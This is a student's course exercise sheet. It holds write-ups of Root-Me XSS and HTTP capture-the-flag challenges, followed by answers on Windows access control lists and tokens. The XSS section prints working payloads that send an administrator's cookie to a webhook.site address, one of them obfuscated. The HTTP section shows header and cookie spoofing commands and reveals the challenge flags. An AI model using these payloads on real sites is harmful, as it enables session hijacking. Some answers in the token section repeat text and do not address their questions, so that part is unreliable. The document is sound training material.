---
title: Exercise Sheet 01
tags:
  - Software-Security
  - Semester-5
  - Informatik
date: 2025-04-28
---
# Vulnerabilities and Access Control Implementation

## 1. Web Application Vulnerabilities (Without Time Constraints)

#### 1.2. Solve 2 of the challenges in the category Challenges => Web-Client that have a name starting with "XSS". \[Groups: 2 challenges per group member, e.g., 6 challenges for 3 persons\]

---
**Challenge 1:** [XSS - Stored - 1](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-1)
we submitted the payload:
```html
<script>new Image().src="https://webhook.site/[id]?c="+document.cookie</script>
```
in the message field.
Because the input wasn’t sanitized, the script was saved and later executed when the "admin" visited the page. The script sent the admin’s cookie to a URL we created on **webhook** site

---
**Challenge 2:** [XSS DOM Based - Introduction](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Introduction)
We first created a link that injected JavaScript into the `number` parameter: 
```http
http://challenge01.root-me.org/web-client/ch32/index.php?number=%27%3Bnew%20Image%28%29.src%3D%22https%3A%2F%2Fwebhook.site%2F8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9%3Fc%3D%22%2Bdocument.cookie%3B%2F%2F
```
We sent this link through the contact form.  
Because the page put the `number` value directly into JavaScript without sanitizing it, my code ran when the admin clicked the link. It sent the admin’s cookie to **webhook** site

---
**Challenge 3:** [XSS DOM Based - AngularJS](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-AngularJS)
First we determine what we can inject by using the following payload:
```js
location.href='https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?c='+document.cookie
```
then convert it to character codes and use it in this payload:
```js
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,56,101,100,54,97,48,57,57,45,101,49,51,100,45,52,99,53,99,45,56,54,55,54,45,98,97,51,56,98,51,101,49,99,51,98,57,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))()}}
```
and then appending it in the `name` parameter and sending it through contact gave the flag through the **webhook** site

---
**Challenge 4:** [XSS - Reflected](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)
Because the admin doesn't click on any links, we tried many links, and finally we found a vulnerability, where the link sent us to a page where we can report a bug to the administrator using:
```
http://challenge01.root-me.org/web-client/ch26/?p=exp' onmouseover='document.write(%22<img src=https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?%22.concat(document.cookie).concat(%22 />%22))
```
where we used **webhook** site to get the cookie of the admin.

---
**Challenge 5:** [XSS - Stored 2](https://www.root-me.org/en/Challenges/Web-Client/XSS-Stored-2)
First we discovered the vulnerability by changing the parameter status from `invite` to 
```html
invite"><img src=1 onerror="window.location='https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?cookie='+document.cookie" />
```
So, this tag gives immediate error for not loading the image and sends the cookie to the webhook.
After that we get `ADMIN_COOKIE=SY2USDIH78TF3DFU78546TE7F`. We insert a new cookie called `ADMIN_COOKIE` with that value and refresh. After that we get the flag in the admin section.

---
**Challenge 6:** [XSS DOM based - Eval](https://www.root-me.org/en/Challenges/Web-Client/XSS-DOM-Based-Eval)
First we discovered the vulnerability by examining the calculator functionality which passes user input through an eval() function. The input needs to satisfy a regex that requires a valid calculation format like `1+1`.

We crafted a payload that starts with a valid calculation and then uses the JavaScript comma operator to execute our malicious code:
```js
1+1,location=`https://webhook.site/8ed6a099-e13d-4c5c-8676-ba38b3e1c3b9?cookie=${document.cookie}`
```

When this payload is passed to the calculation parameter, the eval() function first calculates 1+1 and then redirects to our webhook with the cookie data. Parentheses are blocked by the site, so we used template literals (backticks) to avoid traditional function calls.
After loading the URL with our payload, the page redirected to our webhook, sending the admin cookie.

---
#### 1.3. Solve 5 of the challenges in the category Challenges => Web-Server that have a name starting with "HTTP". \[Groups: All challenges starting with “HTTP”\]

**Challenge 1:** [HTTP - IP restriction bypass](https://www.root-me.org/en/Challenges/Web-Server/HTTP-IP-restriction-bypass)
We used the following command to access the page:
```powershell
curl -H "X-Forwarded-For: 10.0.0.1" http://challenge01.root-me.org/web-serveur/ch68/
```
and then got the output:
```html {9}
<!DOCTYPE html>
<html>
<head>
        <title>Secured Intranet</title>
</head>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
                        <h1>Intranet</h1>
                <div>
                        Well done, the validation password is: <strong>Ip_$po0Fing
</strong>
                </div>
        </body>
</html>
```

---
**Challenge 2:** [HTTP - Open Redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Open-Redirect)
All we needed to do is to change the URL in the `url` parameter to a URL we control like google.com and set the h parameter to MD5 hash of the url:
```http
http://challenge01.root-me.org/web-serveur/ch52/?url=https://google.com&h=99999ebcfdb78df077ad2727fd00969f
```
and using the curl command we get the output:
```html
<p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5</p>
```

---
**Challenge 3:** [HTTP - User-Agent](https://www.root-me.org/en/Challenges/Web-Server/HTTP-User-Agent)
By running this command:
```powershell
curl -H "User-Agent: admin" http://challenge01.root-me.org/web-serveur/ch2/
```
we get:
```html
<html><body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe><h3>Welcome master!<br/>Password: rr$Li9%L34qd1AAe27
</h3></body></html>
```

---
**Challenge 4:** [HTTP - Directory indexing](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Directory-indexing)
after opening the link:
```http
http://challenge01.root-me.org/web-serveur/ch4/admin
```
it opened a folder where eventuely we found a file called `flag.txt` and by opening it we got:
```txt
Password / Mot de passe : LINUX
```

---
**Challenge 5:** [HTTP - Headers](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Headers)
After running the command:
```sh
curl -I "http://challenge01.root-me.org/web-serveur/ch5/"
```
we got the output:
```txt
HTTP/1.1 200 OK
Server: nginx
Date: Mon, 28 Apr 2025 10:35:49 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
Header-RootMe-Admin: none
```
The header Header-RootMe-Admin got my attention so i tried:
```sh
curl -H "Header-RootMe-Admin: admin" "http://challenge01.root-me.org/web-serveur/ch5/"
```
and then somehow got:
```html
<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password HeadersMayBeUseful
</p></body>
</html>
```

---
**Challenge 6:** [HTTP - POST](https://www.root-me.org/en/Challenges/Web-Server/HTTP-POST)
When opening the challenge page, we see this form:
```html
<form action="" method="post" onsubmit="document.getElementsByName('score')[0].value = Math.floor(Math.random() * 1000001)">
  <input type="hidden" name="score" value="-1" />
  <input type="submit" name="generate" value="Give a try!">
</form>
```
The form uses JavaScript to set a random `score` (0–1,000,000) before submitting.  
Since validation is **client-side**, we can bypass it by sending a custom POST request.

Using browser devtools, we copied the cURL command, modified `score=1000000`, and sent it via terminal:
```sh
curl -X POST -d "score=1000000&generate=Give+a+try%21" "http://challenge01.root-me.org/web-serveur/ch56/"
```
The response:
```html
<p>Wow, 1000000! How did you do that? :o</p>
<p>Flag to validate the challenge: <strong>H7tp_h4s_N0_s3Cr37S_F0r_y0U</strong></p>
```

---
**Challenge 7:** [HTTP - Improper redirect](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Improper-redirect)
When opening the challenge page, we see a login form. After submitting random credentials, there’s a redirect.

We ran:
```sh
curl -i "http://challenge01.root-me.org/web-serveur/ch32/"
```
and got:
```txt
HTTP/1.1 302 Found
Location: ./login.php?redirect
```
plus the full HTML content, including:
```html
<p>The flag is : ExecutionAfterRedirectIsBad</p>
```

The trick is that the server redirects, but forgets to stop PHP execution (`exit()` missing), so the flag is leaked after the redirect.

---
**Challenge 8:** [HTTP - Verb tampering](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Verbs-tampering)
When opening the challenge page, the access is denied, likely due to restricted HTTP methods.

We sent a request with the `OPTIONS` method:
```sh
curl -X OPTIONS "http://challenge01.root-me.org/web-serveur/ch8/"
```
and received:
```html
<h1>Mot de passe / password : a23e$dme96d3saez$$prap</h1>
```

The server only blocks GET/POST, but OPTIONS still works.  

---
**Challenge 9:** [HTTP - Cookies](https://www.root-me.org/en/Challenges/Web-Server/HTTP-Cookies)
When opening the challenge page, we see a form to submit an email and a "Saved email addresses" link, but clicking it says "You need to be admin".

In the HTML code, we found:
```html
<!--SetCookie("ch7","visiteur");-->
```
hinting at a cookie.

First, we sent a POST request to get the visitor cookie:
```sh
curl -i -X POST -d "mail=test@example.com&jsep4b=send" "http://challenge01.root-me.org/web-serveur/ch7/"
```
Then manually set the cookie to `admin`:
```sh
curl -i -b "ch7=admin" "http://challenge01.root-me.org/web-serveur/ch7/?c=admin"
```
and got:
```html
<div>Validation password : ml-SYMPA</div>
```

---

## 2. Access Control Implementation: Access Control Lists
#### How are access control lists (DACL) evaluated in Microsoft Windows?
Windows checks DACLs by going through ACEs one by one, top to bottom. It applies the first matching deny or allow rule it finds. Denies are stronger if they come earlier. If nothing matches, access is denied.
#### 2.1.-2.2. How is the special case NULL DACL treated? How is the special case empty DACL treated?
according to [Microsoft](https://learn.microsoft.com/en-us/windows/win32/secauthz/null-dacls-and-empty-dacls), a NULL DACL means that everyone has full access to the object. This is like saying "no restrictions at all." So, if a DACL is NULL, the system treats it as if there are no access rules, and anyone can do anything with that object. A NULL DACL should not be confused with an empty DACL. An empty DACL means no one has access, while a NULL DACL means everyone has access.

#### 2.3. In what order are ACEs processed when an ACL is parsed for matching ACEs?
Windows processes the ACEs in the exact order they are stored in the DACL, from **top to bottom**. 
It checks each ACE one by one until it finds a match for the user or one of their groups.  
If a matching deny ACE is found first, access is denied immediately.
If a matching allow ACE is found, access can be granted but Windows might still check further ACEs if necessary.

#### 2.4. Because of the order in which ACEs are processed – in which order should you store allow ACEs and deny ACEs? Why?
Deny ACEs should be stored first, before any allow ACEs, because Windows checks the ACEs in order and if a deny is found first, it immediately blocks access.  
If you put allow ACEs first, someone might get access before the deny rule is even checked which would be unsafe.

#### 2.5. What system-wide privileges make a DACL ineffective as a protection mechanism and why?
Privileges like **SeTakeOwnershipPrivilege**, **SeBackupPrivilege**, **SeDebugPrivilege** and **SeRestorePrivilege** can make a DACL useless. These privileges allow a user to take ownership of an object, read it, or write to it, even if the DACL says no.
Basically, these privileges override normal access control rules.

---
## 3. Access Control Implementation: Tokens
#### 3.1. Name the security identifiers (SIDs) that are included in a token.
a Windows access token contains the following SIDs:
- **User SID** identifies the user
- **Group SIDs** identify all groups the user belongs to
- **Restricting SID list** SIDs that limit access (if a restricted token is used)
- **Logon session identifier** as a group SID

Additionally, the token includes:
- **Default DACL** to apply permissions when a new object is created
- **Privilege list** a list of special privileges the user has

#### 3.2. Group membership of a subject is checked at the time of token creation. Discuss this design decision both from a security and a runtime performance perspective.
When a process wants to access an object, Windows compares the SIDs in the token (user SID and group SIDs) with the SIDs listed in the object’s DACL.
The system checks if any SID from the token matches an ACE in the DACL:
- If a deny ACE matches first => access is immediately denied.
- If an allow ACE matches => access is granted for the requested permissions.
- If no match is found => access is denied by default.
The comparison is done at handle creation time, not at every access for better performance

#### 3.3. What is the purpose of restricted SIDs in a token?
When a process opens a file (or any object), Windows takes the SIDs in the process’s access token and compares them with the entries in the object’s DACL. 
If it finds a matching **deny** entry first, access is refused and if it finds a matching **allow** entry the requested rights are granted. 
If nothing matches, access is denied. This check is done once so Windows doesn’t repeat it for every read or write.

#### 3.4. Give an example when you should use a restricted token for a child process/thread.
For example the “Open with Notepad” button you sometimes see in a setup tool. 
The installer itself runs with full admin rights so it can write to `C:\Program Files`.  
When the user opens it with notepad to read the licence text, the installer should not pass those admin rights on to Notepad, otherwise the tiny text viewer could delete system files if it were tricked or hijacked.  
Instead, the installer creates a **restricted token** that removes its powerful privileges and starts Notepad with that limited token.  
Now Notepad can read the licence file, but it can’t touch anything outside the installer’s temp folder, keeping the system safe even if Notepad is exploited.